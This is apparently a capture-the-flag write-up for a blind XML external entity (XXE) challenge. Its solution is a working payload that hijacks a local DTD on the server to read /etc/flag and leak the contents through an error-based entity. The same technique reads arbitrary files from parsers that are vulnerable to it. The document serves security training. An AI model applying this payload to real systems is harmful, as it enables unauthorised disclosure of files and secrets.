## Blind XXE Challenge
## Download the source code and look into how the XML File is getting parsed

## Solution
1. Send the POST request to /parse endpoint with the XML file in body that needs to be parsed
2. Send the below payload in the body to retrieve the flag
``` XML
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/svg/svg10.dtd">

    <!ENTITY % descTitleMetadata 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///etc/flag">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

   %local_dtd;
   ]>
   ```